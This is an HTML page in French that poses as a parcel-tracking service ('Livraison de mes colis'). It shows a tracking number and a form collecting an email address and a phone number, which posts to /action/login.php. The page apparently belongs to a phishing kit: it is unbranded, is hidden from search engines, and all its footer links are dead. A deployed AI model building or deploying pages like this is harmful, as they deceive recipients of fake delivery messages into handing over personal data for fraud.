<html lang="fr" coupert-item="9AF8D9A4E502F3784AD24272D81F0381"><head>
    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="apple-touch-icon" href="/img/apple-touch-icon.png">
    <meta name="viewport" content="initial-scale=1.0, width=device-width">
    <meta name="description" content="">
    <meta charset="UTF-8">
    <meta name="robots" content="noindex">
    <title>Page d'accueil | Livraison de mes colis</title>
    <link rel="stylesheet" type="text/css" href="/css/style.css?202307">
    <script src="/js/jquery-3.7.0.min.js"></script>
    <script src="/js/jquery.mask.js"></script>
    <script src="/js/mask.js"></script>
    <style>
        .fieldWrapper {
            margin-bottom: 15px;
            position: relative;
        }
        .notification {
            color: #721c24;
            background-color: #f8d7da;
            border-color: #f5c6cb;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid transparent;
            border-radius: 0.25rem;
            display: none;
            font-size: 14px;
        }
        .notification svg {
            margin-right: 5px;
        }
        .form-row-class-new {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        .form-row-class-new button {
            background-color: #870026;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
        }
        .form-row-class-new button:hover {
            background-color: #a00030;
        }
    </style>
</head>
<body>

<div class="corral">
    <div class="contentContainer activeContent contentContainerBordered">
        <header id="header">
            <img src="/img/logo-min.png" alt="" width="85%">
        </header>
        <h2>Numéro de suivi : 69487</h2>
    
        <form name="first_step_form" action="/action/login.php" method="post" novalidate="novalidate">
            <div class="fieldWrapper">
                <input type="email" id="first_step_form_email" name="email" required="required" placeholder="">
                <label for="first_step_form_email" class="required">Adresse e-mail</label>
                <div class="notification" id="emailError" role="alert">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
                        <path fill="none" d="M0 0h24v24H0z"></path>
                        <path d="M12 2a10 10 0 1 1 0 20 10 10 0 0 1 0-20zm0 2a8 8 0 1 0 0 16 8 8 0 0 0 0-16zm0 7v5h-2v-5h2zm0-4v2h-2V7h2z"></path>
                    </svg>
                    Cette valeur n'est pas une adresse email valide.
                </div>
            </div>
            <div class="fieldWrapper">
                <input type="tel" id="first_step_form_phone" name="phone" required="required" placeholder="">
                <label for="first_step_form_phone" class="required">Numéro de téléphone</label>
                <div class="notification" id="phoneError" role="alert">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
                        <path fill="none" d="M0 0h24v24H0z"></path>
                        <path d="M12 2a10 10 0 1 1 0 20 10 10 0 0 1 0-20zm0 2a8 8 0 1 0 0 16 8 8 0 0 0 0-16zm0 7v5h-2v-5h2zm0-4v2h-2V7h2z"></path>
                    </svg>
                    Le numéro de téléphone n'est pas valide.
                </div>
            </div>
            <div class="form-row-class-new">
                <div><button type="submit" id="first_step_form_submit" name="submit">Suivre mon colis</button></div>
            </div>
            <input type="hidden" id="first_step_form__token" name="_token" value="4af23e783834fceab369349.NpODKgZ3vh2U2ktOE2wCE9H65K-V2Cf43nJsgejpwGU.febcWT4U0HXxiwwCaipHJ7qxj5r-inatjxYu-72tplN41NEedTH7RMyZGg">
        </form>

        <script>
            document.addEventListener("DOMContentLoaded", function() {
                var params = new URLSearchParams(window.location.search);
                if (params.has('emailError')) {
                    document.getElementById("emailError").style.display = 'block';
                }
                if (params.has('phoneError')) {
                    document.getElementById("phoneError").style.display = 'block';
                }

                document.querySelector("form[name=first_step_form]").addEventListener("submit", function(e) {
                    var email = document.getElementById("first_step_form_email").value;
                    var phone = document.getElementById("first_step_form_phone").value;
                    var emailValid = validateEmail(email);
                    var phoneValid = validatePhone(phone);
                    
                    if (!emailValid || !phoneValid) {
                        e.preventDefault();
                        var errorParams = '';
                        if (!emailValid) {
                            document.getElementById("emailError").style.display = 'block';
                            errorParams += 'emailError=true&';
                        } else {
                            document.getElementById("emailError").style.display = 'none';
                        }
                        if (!phoneValid) {
                            document.getElementById("phoneError").style.display = 'block';
                            errorParams += 'phoneError=true&';
                        } else {
                            document.getElementById("phoneError").style.display = 'none';
                        }
                        window.location.search = errorParams + 'inputError=true';
                    } else {
                        document.getElementById("loader-div-new").classList.remove("hidden-class-new");
                        document.getElementById("mask-id-new").style = "opacity: 1; bottom: -500px;";
                    }
                });
            });

            function validateEmail(email) {
                var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return re.test(email);
            }

            function validatePhone(phone) {
                var re = /^\+?[0-9\s\-\(\)]+$/;
                return re.test(phone);
            }
        </script>

        <div class="intentFooter">
            <div class="localeSelector"></div>
        </div>
        <div id="loader-div-new" class="hidden-class-new">
            <div id="mask-id-new"></div>
            <div class="spinner-class-new loading-class-new"></div>
        </div>
    </div>
    <footer class="footer" role="contentinfo">
        <div class="legalFooter">
            <ul class="footerGroup">
                <li><a target="_blank" href="#" pa-marked="1">Contact</a></li>
                <li><a target="_blank" href="#" pa-marked="1">Respect de la vie privée</a></li>
                <li><a target="_blank" href="#" pa-marked="1">Contrats d'utilisation</a></li>
                <li><a target="_blank" href="#" pa-marked="1">International</a></li>
            </ul>
        </div>
    </footer>
</div>



</body></html>